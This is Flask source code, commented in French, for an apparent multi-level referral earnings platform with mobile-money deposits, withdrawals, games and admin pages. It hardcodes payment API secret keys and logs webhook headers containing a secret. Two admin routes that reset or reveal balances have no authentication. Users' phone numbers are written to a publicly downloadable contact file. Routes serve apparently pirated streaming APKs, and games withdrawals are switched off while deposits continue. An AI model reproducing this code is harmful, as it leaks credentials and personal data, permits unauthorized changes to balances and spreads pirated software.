# 1️⃣ Page dashboard_bloque (initiation paiement)
# --------------------------------------
from urllib.parse import urlencode

@app.route("/api/webhook/soleaspay", methods=["POST"])
def webhook_soleaspay():

    print("=" * 50)
    print("WEBHOOK RECU")
    print("HEADERS:", dict(request.headers))
    print("JSON:", request.get_json())
    print("=" * 50)

    received_key = request.headers.get("x-private-key")

    if received_key != SOLEAS_WEBHOOK_SECRET:
        return jsonify({"error": "Unauthorized"}), 403

    data = request.get_json()

    details = data.get("data", {})
    external_reference = details.get("external_reference")

    if not external_reference.startswith("NOVA-"):
        return jsonify({"ignored": True})

    depot_id = int(external_reference.replace("NOVA-", ""))

    depot = db.session.get(Depot, depot_id)

    if not depot:
        return jsonify({"error": "Depot not found"}), 404

    if depot.statut == "valide":
        return jsonify({"received": True})

    success = data.get("success")
    status = data.get("status")

    if success and status == "SUCCESS":

        amount = int(float(details.get("amount", 0)))

        if int(depot.montant) != amount:
            return jsonify({"error": "Wrong amount"}), 400

        user = User.query.filter_by(username=depot.user_name).first()

        depot.statut = "valide"
        depot.reference = details.get("reference")

        user.solde_depot += depot.montant
        user.solde_total += depot.montant

        if not user.premier_depot:
            user.premier_depot = True
            if user.parrain:
                donner_commission(user.parrain, depot.montant)

        db.session.commit()

    elif success is False:

        depot.statut = "echoue"
        db.session.commit()

    return jsonify({"received": True})


@app.route("/paiement/soleaspay/retour")
def bkapay_retour():
    status = request.args.get("status")

    # 🔐 Récupération de l'utilisateur connecté
    user = get_logged_in_user()  # Assure-toi que cette fonction retourne l'utilisateur connecté

    if status == "success":
        flash("Paiement reçu ! Votre compte sera activé automatiquement.", "success")


        db.session.commit()
        return redirect(url_for("dashboard_pay_ok"))

    # Paiement échoué ou annulé
    flash("Paiement échoué ou annulé.", "danger")
    return redirect(url_for("dashboard_bloque"))

@app.route("/dashboard/pay/ok", methods=["GET"])
def dashboard_pay_ok():
    user_id = session.get("user_id")
    if not user_id:
        flash("Vous devez vous connecter pour accéder au dashboard.", "danger")
        return redirect(url_for("connexion_page"))

    user = db.session.get(User, user_id)
    if not user:
        session.clear()
        flash("Session invalide, veuillez vous reconnecter.", "danger")
        return redirect(url_for("connexion_page"))

    # ✅ MARQUER DÉFINITIVEMENT L'ACCÈS PAY OK
    if not user.has_seen_pay_ok:
        user.has_seen_pay_ok = True
        db.session.commit()

    # 🔗 Lien de parrainage
    referral_code = user.username
    referral_link = url_for("inscription_page", _external=True) + f"?ref={referral_code}"

    # 📊 Stats globales
    total_users, total_deposits, total_withdrawn = get_global_stats()
    revenu_cumule = (user.solde_parrainage or 0) + (user.solde_revenu or 0)

    return render_template(
        "dashboard.html",
        user=user,
        points=user.points or 0,
        revenu_cumule=revenu_cumule,
        solde_parrainage=user.solde_parrainage or 0,
        solde_revenu=user.solde_revenu or 0,
        total_users=total_users,
        total_deposits=total_deposits,
        total_withdrawn=total_withdrawn,
        total_withdrawn_user=getattr(user, "total_retrait", 0),
        referral_code=referral_code,
        referral_link=referral_link
    )



@app.route("/api/check-activation")
def api_check_activation():
    user = get_logged_in_user()
    return {
        "activated": user_is_activated(user)
    }

@app.route("/chaine")
def whatsapp_channel():
    return render_template("chaine.html")

from datetime import datetime, timedelta

# Assure-toi que ces constantes sont définies en haut de ton app.py
MAX_GAIN = 500.0
CYCLE_DAYS = 3
WINDOW_HOURS = 24

@app.route("/dashboard")
def dashboard_page():
    user_id = session.get("user_id")
    if not user_id:
        flash("Vous devez vous connecter.", "danger")
        return redirect(url_for("connexion_page"))

    user = db.session.get(User, user_id)
    if not user:
        session.clear()
        return redirect(url_for("connexion_page"))

    # --- LOGIQUE DE PARRAINAGE ET STATS ---
    referral_code = user.username
    referral_link = url_for("inscription_page", _external=True) + f"?ref={referral_code}"

    if not user_is_activated(user) and not user.has_seen_pay_ok:
        return redirect(url_for("dashboard_bloque"))

    total_users, total_deposits, total_withdrawn = get_global_stats()
    revenu_cumule = (user.solde_parrainage or 0) + (user.solde_revenu or 0)

    # --- NOUVELLE LOGIQUE DE JEU (STRICTE) ---
    now = datetime.now()
    total_bonus = user.bonus or 0.0
    is_blocked_500 = total_bonus >= MAX_GAIN
    no_rounds_left = (user.remaining_rounds or 0) <= 0
    
    can_play = False
    next_date = None
    
    # Date de référence pour le cycle
    base_date = user.last_play_date or user.date_creation

    if base_date and not is_blocked_500 and not no_rounds_left:
        next_date = base_date + timedelta(days=CYCLE_DAYS)
        deadline_date = next_date + timedelta(hours=WINDOW_HOURS)

        if now < next_date:
            can_play = False
        elif next_date <= now <= deadline_date:
            can_play = True
        elif now > deadline_date:
            # Fenêtre ratée : On applique la pénalité immédiatement
            user.remaining_rounds -= 1
            user.last_play_date = next_date 
            db.session.commit()
            return redirect(url_for("dashboard_page"))

    # Cas spécial : Premier jeu après inscription
    if not user.last_play_date and not no_rounds_left and not is_blocked_500:
        can_play = True

    return render_template(
        "dashboard.html",
        user=user,
        points=user.points or 0,
        revenu_cumule=revenu_cumule,
        solde_parrainage=user.solde_parrainage or 0,
        solde_revenu=user.solde_revenu or 0,
        total_users=total_users,
        total_withdrawn_user=user.total_retrait or 0,
        total_deposits=total_deposits,
        referral_code=referral_code,
        referral_link=referral_link,
        total_withdrawn=total_withdrawn,

        # --- VARIABLES JEU ---
        can_play=can_play,
        next_date=next_date,
        rounds_left=user.remaining_rounds or 0,
        is_blocked_500=(is_blocked_500 or no_rounds_left)
    )

def user_is_activated(user):

    if not user:
        return False

    if user.premier_depot:
        return True

    return Depot.query.filter(
        (Depot.user_id == user.id) |
        (Depot.user_name == user.username),
        Depot.statut == "valide"
    ).first() is not None

# ===== Décorateur admin =====
def admin_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if not current_user.is_authenticated or not getattr(current_user, "is_admin", False):
            abort(403)
        return f(*args, **kwargs)
    return decorated

@app.route("/admin/users")
def admin_users():
    user = get_logged_in_admin()

    if not user:
        flash("Accès refusé.", "danger")
        return redirect(url_for("admin_finance"))

    users = User.query.order_by(User.date_creation.desc()).all()

    user_data = []
    for u in users:
        niveau1 = u.downlines.count()
        niveau2 = sum([child.downlines.count() for child in u.downlines])
        niveau3 = sum([sum([c.downlines.count() for c in child.downlines]) for child in u.downlines])

        user_data.append({
            "username": u.username,
            "email": u.email,
            "phone": u.phone,
            "parrain": u.parrain if u.parrain else "—",
            "niveau1": niveau1,
            "niveau2": niveau2,
            "niveau3": niveau3,
            "date_creation": u.date_creation,
            "premier_depot": u.premier_depot
        })

    return render_template("admin_users.html", user=user, users=user_data)

@app.route("/admin/users/inactifs")
def admin_users_inactifs():
    user = get_logged_in_admin()

    if not user:
        flash("Accès refusé.", "danger")
        return redirect(url_for("admin_finance"))

    inactifs = User.query.filter_by(premier_depot=False).order_by(User.date_creation.desc()).all()

    return render_template(
        "admin_users_inactifs.html",
        user=user,
        inactifs=inactifs,
        total_inactifs=len(inactifs)
    )

@app.route("/admin/users/actifs")
def admin_users_actifs():
    user = get_logged_in_admin()

    if not user:
        flash("Accès refusé.", "danger")
        return redirect(url_for("admin_finance"))

    actifs = User.query.filter_by(premier_depot=True).order_by(User.date_creation.desc()).all()

    return render_template(
        "admin_users_actifs.html",
        user=user,
        actifs=actifs,
        total_actifs=len(actifs)
    )

@app.route("/admin/login", methods=["GET", "POST"])
def admin_login():
    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")
        # Vérifie l'utilisateur admin
        user = User.query.filter_by(username=username, is_admin=True).first()
        if user and check_password_hash(user.password, password):
            session["admin_id"] = user.id
            return redirect(url_for("admin_canal_edit"))
        else:
            flash("Nom d'utilisateur ou mot de passe incorrect.", "danger")
            return redirect(url_for("admin_login"))
    return render_template("admin_login.html")

@app.route("/admin/parrainage", methods=["GET", "POST"])
def admin_parrainage():
    if "admin_id" not in session:
        return redirect(url_for("admin_login"))

    users = User.query.order_by(User.username.asc()).all()

    if request.method == "POST":
        user_id = request.form.get("user_id")
        nouveau_username = (request.form.get("username") or "").strip().lower()
        nouveau_parrain = (request.form.get("parrain") or "").strip().lower()
        nouveau_phone = (request.form.get("phone") or "").strip()

        user = User.query.get(user_id)

        if not user:
            flash("Utilisateur introuvable.", "danger")
            return redirect(url_for("admin_parrainage"))

        # ✅ Modifier USERNAME
        if nouveau_username and nouveau_username != user.username:

            # Vérification format (lettres minuscules + chiffres seulement)
            if not nouveau_username.isalnum() or not nouveau_username.islower():
                flash("Le username doit contenir uniquement lettres minuscules et chiffres.", "danger")
                return redirect(url_for("admin_parrainage"))

            # Vérification unicité
            username_existe = User.query.filter(
                User.username == nouveau_username,
                User.id != user.id
            ).first()

            if username_existe:
                flash("Ce username est déjà utilisé.", "danger")
                return redirect(url_for("admin_parrainage"))

            ancien_username = user.username
            user.username = nouveau_username

            # 🔥 Mettre à jour tous ceux qui ont cet ancien username comme parrain
            filleuls = User.query.filter_by(parrain=ancien_username).all()
            for f in filleuls:
                f.parrain = nouveau_username

        # ✅ Modifier PHONE
        if nouveau_phone and nouveau_phone != user.phone:
            phone_existe = User.query.filter(
                User.phone == nouveau_phone,
                User.id != user.id
            ).first()

            if phone_existe:
                flash("Numéro déjà utilisé.", "danger")
                return redirect(url_for("admin_parrainage"))

            user.phone = nouveau_phone

        # ✅ Modifier PARRAIN
        if nouveau_parrain == "":
            user.parrain = None
        else:
            parrain_user = User.query.filter_by(username=nouveau_parrain).first()
            if not parrain_user:
                flash("Parrain invalide.", "danger")
                return redirect(url_for("admin_parrainage"))

            if nouveau_parrain == user.username:
                flash("Un utilisateur ne peut pas être son propre parrain.", "danger")
                return redirect(url_for("admin_parrainage"))

            user.parrain = nouveau_parrain

        db.session.commit()
        flash(f"✅ Mise à jour effectuée pour {user.username}.", "success")
        return redirect(url_for("admin_parrainage"))

    return render_template("admin_parrainage.html", users=users)

# ===== Helpers =====
def get_logged_in_user_phone():
    return session.get("phone")

from flask import send_from_directory

@app.route('/download/contact')
def download_contact():
    return send_from_directory('static/files', 'con.vcf', as_attachment=True)

from flask import Flask, render_template


# Route pour la page About
@app.route("/about")
def about():
    return render_template("about.html")

def get_service_name(service_id):
    """
    Cherche le nom du service dans tous les pays pour un ID donné.
    """
    for country_services in SERVICES.values():
        for s in country_services:
            if s["id"] == service_id:
                return s["name"]
    return f"Service {service_id}"  # fallback si ID inconnu

@app.route("/mes-retraits")
def mes_retraits():
    user = get_logged_in_user()

    # CORRECTION : Filtrer par user_id au lieu du numéro de téléphone
    retraits = Retrait.query.filter_by(user_id=user.id).order_by(Retrait.date.desc()).all()

    # Ajouter le nom lisible pour chaque retrait
    for r in retraits:
        # On s'assure que service_name est bien défini pour le template
        r.service_name = get_service_name(r.payment_method)

    return render_template("mes_retraits.html", retraits=retraits, user=user)


from datetime import datetime

from datetime import date

@app.route("/taches/click-jeudi", methods=["GET", "POST"])
def click_jeudi():
    user = get_logged_in_user()

    # Vérifier si c'est jeudi
    if date.today().weekday() != 3:  # 0 = lundi, 3 = jeudi
        return render_template("pas_jeudi.html", user=user)

    # Vérifier si l'utilisateur a déjà fait le click cette semaine
    debut_semaine = date.today() - timedelta(days=date.today().weekday())  # lundi de cette semaine
    deja_fait = ClickJeudiReponse.query.filter(
        ClickJeudiReponse.user_id == user.id,
        ClickJeudiReponse.date >= debut_semaine
    ).first()

    if deja_fait:
        return render_template("deja_click.html", user=user)

    if request.method == "POST":
        points = 20
        user.points = user.points or 0  # corrige le None
        user.points += points
        db.session.commit()

        # Enregistrer la tentative
        click_reponse = ClickJeudiReponse(user_id=user.id, points=points, date=date.today())
        db.session.add(click_reponse)
        db.session.commit()

        return render_template("resultat_click.html", points=points, user=user)

    return render_template("click_jeudi.html", user=user)


@app.route("/whatsapp-number", methods=["POST"])
def whatsapp_number():
    user = User.query.get(session["user_id"])

    number = request.form.get("number").strip()

    if not number.startswith("+") or not number[1:].isdigit() or len(number) < 10:
        flash("Numéro invalide !", "error")
        return redirect("/dashboard")

    user.whatsapp_number = number
    db.session.commit()

    vcf_path = os.path.join("static", "files", "con.vcf")

    try:
        with open(vcf_path, "a", encoding="utf-8") as file:
            file.write(
                f"BEGIN:VCARD\n"
                f"VERSION:3.0\n"
                f"N:{user.username}\n"
                f"TEL:{number}\n"
                f"END:VCARD\n\n"
            )
    except Exception as e:
        print("Erreur VCF :", e)

    return redirect("/dashboard")

@app.route("/netflix-view")
def netflix_view_page():
    return render_template("netflix.html")


@app.route("/apk")
def apk_page():
    """
    Retourne la liste des APK disponibles via liens Google Drive.
    """
    apk_files = [
        {
            "name": "Netflix",
            "filename": "Netflix.apk",
            "link": "https://drive.google.com/file/d/1afSa24_oVoTWRCgpO07Lbu4qjKMUhwLC/view?usp=drivesdk"
        },
        {
            "name": "Chat",
            "filename": "chat.apk",
            "link": "https://drive.google.com/file/d/1-4idwrgNxjNilpLzR8zHkdMroVo41g9b/view?usp=drivesdk"
        },
        {
            "name": "CapCut",
            "filename": "capcut.apk",
            "link": "https://drive.google.com/file/d/1hwEzqwQWV2FKnTg1u0QAWrPjjOEyZCyj/view?usp=drivesdk"
        }
    ]

    return render_template("apk.html", apk_files=apk_files)

@app.route("/apk-canal")
def apk_canal_page():
    # Lien de ton application
    canal_apk = {
        "name": "Canal+ Premium",
        "filename": "canal_plus_vavoo.apk",
        "link": "https://drive.google.com/uc?id=15G5lmyNMw2xYTm_XvvhIX77uBqT99lLq", # Lien direct vers le téléchargement
        "reference": "Vavoo.to"
    }
    return render_template("apk_canal.html", app=canal_apk)


@app.route("/ecom")
def ecom():
    return render_template("ecom.html")

@app.route("/nous")
def nous_page():
    return render_template("nous.html")

@app.route("/trade")
def trade():
    return render_template("trade.html")

from flask import send_from_directory

@app.route("/sitemap.xml")
def sitemap():
    return send_from_directory(".", "sitemap.xml")

from flask import request, redirect, url_for, flash
import os
from werkzeug.utils import secure_filename
from datetime import datetime



PUBLIC_API_KEY = "SP_y7QKkaamPsVTlw8GDDGyzlJ7bmPUvdLorOQqWUXfRLI_AP"
PRIVATE_SECRET_KEY = "SP_bS4Kwii-Txs1aMunv8D9wpEbdpEVgfpvDvKn-OrWt6Y"

from datetime import datetime

@app.route("/retrait", methods=["GET", "POST"])
def retrait_page():
    user = get_logged_in_user()

    if not user:
        flash("Veuillez vous connecter.", "danger")
        return redirect(url_for("login"))

    MIN_RETRAIT = 5000
    MAX_RETRAIT = 50000
    FRAIS = 500

    # On s'assure que c'est bien un float
    solde_actuel = float(user.solde_parrainage or 0)
    stats = {"commissions_total": solde_actuel}

    country_code = COUNTRY_CODE.get(user.country)
    services = SERVICES.get(country_code, [])

    if request.method == "POST":
        try:
            montant = float(request.form.get("montant", 0))
            service_id = int(request.form.get("payment_method", 0))
        except (ValueError, TypeError):
            flash("Données de formulaire invalides.", "danger")
            return redirect(url_for("retrait_page"))

        wallet = request.form.get("phone", "").strip()
        pin = request.form.get("pin", "").strip()

        # ==========================
        # VALIDATIONS
        # ==========================
        if montant < MIN_RETRAIT or montant > MAX_RETRAIT:
            flash(f"Le montant doit être entre {MIN_RETRAIT} et {MAX_RETRAIT} XOF.", "danger")
            return redirect(url_for("retrait_page"))

        montant_total = montant + FRAIS

        if montant_total > solde_actuel:
            flash("Solde insuffisant pour couvrir le montant et les frais (500 XOF).", "danger")
            return redirect(url_for("retrait_page"))

        service = next((s for s in services if s["id"] == service_id), None)
        if not service:
            flash("Service de paiement invalide.", "danger")
            return redirect(url_for("retrait_page"))

        # ==========================
        # 🔐 PIN CHECK
        # ==========================
        if not user.pin_code:
            flash("Veuillez définir votre code PIN dans votre profil.", "danger")
            return redirect(url_for("profile_page"))

        # On utilise check_password_hash pour comparer le PIN haché
        if not check_password_hash(user.pin_code, pin):
            flash("Code PIN incorrect.", "danger")
            return redirect(url_for("retrait_page"))

        # ==========================
        # API RETRAIT
        # ==========================
        response = envoyer_retrait_soleaspay(service_id, wallet, montant)

        if not response or response.get("success") != True:
            # On affiche le message d'erreur de l'API s'il existe
            error_msg = response.get('message', 'Erreur API paiement.') if response else 'Erreur de connexion API.'
            flash(error_msg, "danger")
            return redirect(url_for("retrait_page"))

        # ==========================
        # SAVE DB (Sécurisé)
        # ==========================
        try:
            nouveau_retrait = Retrait(
                user_id=user.id,
                montant=montant,
                frais=FRAIS,
                payment_method=service["name"],
                statut="successful",
                phone=wallet,
                pays=user.country,
                date=datetime.utcnow() # Utilisation de datetime.utcnow()
            )

            db.session.add(nouveau_retrait)

            # Mise à jour des soldes
            user.solde_parrainage = float(user.solde_parrainage) - montant_total
            user.total_retrait = (float(user.total_retrait or 0)) + montant

            db.session.commit()
            flash("Retrait effectué avec succès ✅", "success")
            return redirect(url_for("mes_retraits"))

        except Exception as e:
            db.session.rollback()
            print(f"❌ ERREUR STOCKAGE : {str(e)}")
            flash("Erreur lors de l'enregistrement du retrait.", "danger")
            return redirect(url_for("retrait_page"))

    return render_template("retrait.html", user=user, stats=stats, services=services)

@app.route("/retrait-casino", methods=["GET", "POST"])
def retrait_casino_page():
    user = get_logged_in_user()
    if not user:
        return redirect(url_for('login'))

    MIN_RETRAIT = 500
    # On s'assure que bonus_total est traité comme un nombre
    bonus_total = float(user.bonus or 0)

    # Récupérer les services de paiement du pays de l'utilisateur
    country_code = COUNTRY_CODE.get(user.country)
    services = SERVICES.get(country_code, [])

    if request.method == "POST":
        montant = float(request.form.get("montant", 0))
        service_id = int(request.form.get("payment_method", 0))
        wallet = request.form.get("wallet", "").strip()

        # 1. VALIDATIONS DE BASE
        if not wallet or len(wallet) < 8:
            flash("Numéro de téléphone invalide.", "danger")
            return redirect(url_for("retrait_casino_page"))

        if montant < MIN_RETRAIT:
            flash(f"Le minimum est de {MIN_RETRAIT} XOF.", "danger")
            return redirect(url_for("retrait_casino_page"))

        if montant > bonus_total:
            flash("Solde insuffisant.", "danger")
            return redirect(url_for("retrait_casino_page"))

        # 2. APPEL API SOLEASPAY
        # On lance le paiement directement
        response = envoyer_retrait_soleaspay(service_id, wallet, montant)

        if response and response.get("success") == True:
            # 3. ENREGISTREMENT ET DÉDUCTION
            try:
                # On déduit le solde
                user.bonus -= montant
                
                # On crée la trace du retrait
                nouveau_retrait = Retrait(
                    user_id=user.id,
                    montant=montant,
                    frais=0,
                    payment_method=service_id,
                    statut="successful",
                    phone=wallet,
                    pays=user.country,
                    date=datetime.now()
                )
                
                db.session.add(nouveau_retrait)
                db.session.commit()

                flash(f"Retrait de {montant} XOF envoyé avec succès vers {wallet} !", "success")
                return redirect(url_for("dashboard_page"))
                
            except Exception as e:
                db.session.rollback()
                flash("Erreur lors de la mise à jour du solde.", "danger")
        else:
            error_msg = response.get('message', 'Échec de la transaction API') if response else "Service indisponible"
            flash(f"Erreur : {error_msg}", "danger")

    return render_template(
        "retrait_casino.html",
        user=user,
        bonus_total=bonus_total,
        services=services,
        min_retrait=MIN_RETRAIT
    )


@app.route("/admin/reset-soldes-speciaux")
def reset_soldes():
    try:
        # On cible uniquement ceux qui ont plus de 300
        utilisateurs_concernes = User.query.filter(User.solde_jeux > 300).all()
        
        nombre = len(utilisateurs_concernes)
        for u in utilisateurs_concernes:
            u.solde_jeux = 100
        
        db.session.commit()
        return f"Succès : {nombre} soldes ont été réinitialisés à 100 XOF."
    except Exception as e:
        db.session.rollback()
        return f"Erreur lors de la mise à jour : {str(e)}"

@app.route("/admin/stats-jeux")
def stats_jeux():
    # Tout calcul de base de données doit être à l'intérieur de la fonction
    
    # 1. On compte les utilisateurs (Plus de 300 XOF)
    nb_joueurs_riches = User.query.filter(User.solde_jeux > 300).count()
    
    # 2. On calcule la somme cumulée
    # Note : Assure-toi d'avoir importé 'func' : from sqlalchemy import func
    somme_totale = db.session.query(func.sum(User.solde_jeux)).filter(User.solde_jeux > 300).scalar() or 0
    
    return f"""
    <div style="font-family: sans-serif; padding: 20px; border-left: 5px solid #5a57e3; background: #f8fafc;">
        <h2 style="color: #5a57e3;">Statistiques Solde Jeux</h2>
        <p><b>Utilisateurs (> 300 XOF) :</b> {nb_joueurs_riches}</p>
        <p><b>Masse monétaire cumulée :</b> {somme_totale:,.0f} XOF</p>
    </div>
    """


@app.route("/retrait-jeux", methods=["GET", "POST"])
def retrait_jeux_page():
    user = get_logged_in_user()
    
    # --- CONFIGURATION DE SUSPENSION ---
    MAINTENANCE_RETRAIT = True  # Mettre à False pour réactiver
    # ------------------------------------

    MIN_RETRAIT = 4000
    FRAIS = 500
    solde_dispo = float(user.solde_jeux or 0)

    country_code = COUNTRY_CODE.get(user.country)
    services = SERVICES.get(country_code, [])

    if request.method == "POST":
        # Sécurité serveur : Bloque le traitement même si le HTML est modifié
        if MAINTENANCE_RETRAIT:
            flash("Action impossible : Les retraits sont actuellement suspendus.", "danger")
            return redirect(url_for("retrait_jeux_page"))

        try:
            montant = float(request.form.get("montant", 0))
            service_id = int(request.form.get("payment_method"))
            numero_retrait = request.form.get("wallet", "").strip()
        except (ValueError, TypeError):
            flash("Données invalides.", "danger")
            return redirect(url_for("retrait_jeux_page"))

        if not numero_retrait:
            flash("Veuillez saisir un numéro de réception.", "danger")
            return redirect(url_for("retrait_jeux_page"))

        if montant < MIN_RETRAIT:
            flash(f"Le montant minimum est de {MIN_RETRAIT} XOF.", "danger")
            return redirect(url_for("retrait_jeux_page"))

        montant_total = montant + FRAIS

        if montant_total > solde_dispo:
            flash(f"Solde jeux insuffisant. Requis: {montant_total} XOF.", "danger")
            return redirect(url_for("retrait_jeux_page"))

        valid_services = [s["id"] for s in services]
        if service_id not in valid_services:
            flash("Service de paiement invalide.", "danger")
            return redirect(url_for("retrait_jeux_page"))

        # Simulation / Appel API
        response = envoyer_retrait_soleaspay(service_id, numero_retrait, montant)

        if not response or response.get("success") is not True:
            flash(f"Erreur : {response.get('message', 'Échec de la transaction')}", "danger")
            return redirect(url_for("retrait_jeux_page"))

        # Enregistrement en base de données
        nouveau_retrait = Retrait(
            user_id=user.id,
            montant=montant,
            frais=FRAIS,
            payment_method=service_id,
            statut="successful",
            phone=numero_retrait,
            pays=user.country,
            date=datetime.utcnow()
        )
        
        user.solde_jeux -= montant_total
        db.session.add(nouveau_retrait)
        db.session.commit()

        flash(f"Retrait de {montant} XOF réussi vers {numero_retrait}.", "success")
        return redirect(url_for("dashboard_page"))

    return render_template(
        "retrait_jeux.html",
        user=user,
        solde_dispo=solde_dispo,
        services=services,
        min_retrait=MIN_RETRAIT,
        frais=FRAIS,
        maintenance=MAINTENANCE_RETRAIT
    )


def get_team_total(user):
    # 1. Niveau 1 : On ne récupère que les usernames pour économiser la RAM
    niveau1_data = User.query.with_entities(User.username).filter_by(parrain=user.username).all()
    if not niveau1_data:
        return 0

    usernames_n1 = [u.username for u in niveau1_data]
    total = len(usernames_n1)

    # 2. Niveau 2 : On récupère aussi uniquement les usernames
    niveau2_data = User.query.with_entities(User.username).filter(User.parrain.in_(usernames_n1)).all()
    total += len(niveau2_data)

    if niveau2_data:
        # 3. Niveau 3 : Ici ta logique .count() est déjà parfaite
        usernames_n2 = [u.username for u in niveau2_data]
        niveau3_count = User.query.filter(User.parrain.in_(usernames_n2)).count()
        total += niveau3_count

    return total

@app.route("/profile", methods=["GET", "POST"])
def profile_page():
    user = get_logged_in_user()

    if request.method == "POST":
        # ... (Ta logique photo et PIN reste strictement identique)
        if "profile_photo" in request.files:
            file = request.files["profile_photo"]
            if file.filename != "" and allowed_file(file.filename):
                filename = secure_filename(file.filename)
                filename = f"{user.uid}_{filename}"
                filepath = os.path.join(app.config['UPLOAD_FOLDER_PROFILE'], filename)
                file.save(filepath)
                user.profile_image = filename
                db.session.commit()
                flash("Photo mise à jour !", "success")

        elif "update_pin" in request.form:
            pin = request.form.get("pin")
            confirm_pin = request.form.get("confirm_pin")
            if not pin or not confirm_pin:
                flash("Champs obligatoires.", "danger")
            elif not pin.isdigit() or len(pin) != 6:
                flash("PIN : 6 chiffres requis.", "danger")
            elif pin != confirm_pin:
                flash("Les PIN ne correspondent pas.", "danger")
            else:
                user.pin_code = generate_password_hash(pin)
                db.session.commit()
                flash("Code PIN mis à jour ! 🔐", "success")
        return redirect(url_for("profile_page"))

    profile_pic = user.profile_image if user.profile_image else 'default.png'
    team_total = get_team_total(user)

    return render_template(
        "profile.html",
        user=user,
        profile_pic=profile_pic,
        team_total=team_total
    )


@app.route("/revenus")
def revenus_page():
    user = get_logged_in_user()

    total_points = sum([
        user.points_youtube or 0,
        user.points_tiktok or 0,
        user.points_instagram or 0,
        user.points_ads or 0,
        user.points_spin or 0,
        user.points_games or 0,
    ])

    team_total = get_team_total(user)
    total_commission = user.solde_revenu or 0

    return render_template(
        "revenus.html",
        user=user,
        points_youtube=user.points_youtube,
        points_tiktok=user.points_tiktok,
        points_instagram=user.points_instagram,
        points_ads=user.points_ads,
        points_spin=user.points_spin,
        points_games=user.points_games,
        team_total=team_total,
        total_commission=total_commission
    )

@app.route("/points/retrait", methods=["GET", "POST"])
def retrait_points_page():
    user = get_logged_in_user()

    # Calculer le montant des points disponibles
    total_points = (
        (user.points or 0) +
        (user.points_video or 0) +
        (user.points_youtube or 0) +
        (user.points_tiktok or 0) +
        (user.points_instagram or 0) +
        (user.points_ads or 0) +
        (user.points_spin or 0) +
        (user.points_games or 0)
    )
    tranches = total_points // 100
    montant_xof = tranches * 200
    points_utilisables = tranches * 100
    retrait_min = 4000

    if request.method == "POST":
        if montant_xof < retrait_min:
            flash(f"Le montant minimum pour un retrait est de {retrait_min} XOF.", "danger")
            return redirect(url_for("retrait_points_page"))

        payment_method = request.form.get("payment_method")
        if not payment_method:
            flash("Veuillez sélectionner un mode de paiement.", "danger")
            return redirect(url_for("retrait_points_page"))

        # Créer la demande de retrait (à traiter par admin si nécessaire)
        retrait = RetraitPoints(
            user_id=user.id,
            points_utilises=points_utilisables,
            montant_xof=montant_xof,
            statut='en_attente'
        )
        db.session.add(retrait)

        # Déduire les points utilisés
        user.points = total_points - points_utilisables
        db.session.commit()

        flash(f"Votre demande de retrait de {montant_xof} XOF a été enregistrée.", "success")
        return redirect(url_for("retrait_points_page"))

    return render_template(
        "retrait_points.html",
        user=user,
        montant_xof=montant_xof,
        points_utilisables=points_utilisables,
        retrait_min=retrait_min
    )

@app.route("/wheel")
def wheel():
    user = get_logged_in_user()

    # Vérifier si l’utilisateur a déjà tourné la roue
    if user.has_spun_wheel:
        already_spun = True
    else:
        already_spun = False

    return render_template("wheel.html", user=user, already_spun=already_spun)

import random

@app.route("/wheel/spin", methods=["POST"])
def spin_wheel():
    user = get_logged_in_user()

    # Si déjà tourné → refus
    if user.has_spun_wheel:
        return jsonify({"status": "error", "message": "Vous avez déjà utilisé votre chance !"})

    import random

    values = [0, 50, 80, 130, 150, 180, 200, 220, 250, 300, 340, 460]

    # Génération pondérée (rare, commun)
    weighted = []
    for v in values:
        if v in [250, 300, 340, 460]:
            weighted += [v] * 1
        elif v >= 200:
            weighted += [v] * 3
        else:
            weighted += [v] * 10

    reward = random.choice(weighted)

    # Enregistrer que le joueur a déjà joué
    user.has_spun_wheel = True
    user.solde_revenu += reward
    db.session.commit()

    return jsonify({"status": "success", "reward": reward})

@app.route("/team")
def team_page():
    user = get_logged_in_user()

    referral_code = user.username
    referral_link = url_for("inscription_page", _external=True) + f"?ref={referral_code}"

    # On ne récupère que les infos nécessaires pour l'affichage (Username, Phone, Pays, Premier_depot)
    # Niveau 1
    level1 = User.query.with_entities(
        User.username, User.phone, User.country, User.premier_depot, User.date_creation
    ).filter_by(parrain=user.username).all()
    
    level1_usernames = [u.username for u in level1]

    # Niveau 2
    level2 = []
    level2_usernames = []
    if level1_usernames:
        level2 = User.query.with_entities(
            User.username, User.phone, User.country, User.premier_depot, User.date_creation
        ).filter(User.parrain.in_(level1_usernames)).all()
        level2_usernames = [u.username for u in level2]

    # Niveau 3
    level3 = []
    if level2_usernames:
        level3 = User.query.with_entities(
            User.username, User.phone, User.country, User.premier_depot, User.date_creation
        ).filter(User.parrain.in_(level2_usernames)).all()

    stats = {
        "level1": len(level1),
        "level2": len(level2),
        "level3": len(level3),
        "commissions_total": float(user.solde_revenu or 0)
    }

    return render_template(
        "team.html",
        referral_link=referral_link,
        stats=stats,
        level1_users=level1,
        level2_users=level2,
        level3_users=level3
    )

# ===== Page de connexion admin =====
@app.route("/admin/finance", methods=["GET", "POST"])
def admin_finance():
    submitted = False  # Sert à afficher le loader
    if request.method == "POST":
        submitted = True
        username = request.form.get("username")
        password = request.form.get("password")

        # Vérifie l'utilisateur admin
        user = User.query.filter_by(username=username, is_admin=True).first()
        if user and check_password_hash(user.password, password):
            session["admin_id"] = user.id  # Stocke l'id de l'admin
            # Redirection vers admin_deposits après connexion
            return redirect(url_for("admin_deposits"))
        else:
            flash("Nom d'utilisateur ou mot de passe incorrect.", "danger")
            # Reste sur la page avec le message flash
            return render_template("admin_finance.html", submitted=False)

    # GET → formulaire normal
    return render_template("admin_finance.html", submitted=submitted)

# ===== Détection de l'admin connecté =====
def get_logged_in_admin():
    admin_id = session.get("admin_id")
    if admin_id:
        return User.query.filter_by(id=admin_id, is_admin=True).first()
    return None

from flask import request, render_template, flash, redirect, url_for

PER_PAGE = 50


from sqlalchemy import func

@app.route("/admin/deposits")
def admin_deposits():
    user = get_logged_in_admin()
    if not user:
        flash("Accès refusé.", "danger")
        return redirect(url_for("admin_finance"))

    page = request.args.get("page", 1, type=int)
    PER_PAGE = 50

    # 1. UTILISATEURS PAGINÉS
    users_paginated = User.query.order_by(User.date_creation.desc()).paginate(page=page, per_page=PER_PAGE, error_out=False)
    
    # Séparation Actifs/Inactifs de la page courante
    actifs = [u for u in users_paginated.items if u.premier_depot]
    inactifs = [u for u in users_paginated.items if not u.premier_depot]

    # Stats Globales (Rapide)
    total_actifs = User.query.filter_by(premier_depot=True).count()
    total_inactifs = User.query.filter_by(premier_depot=False).count()

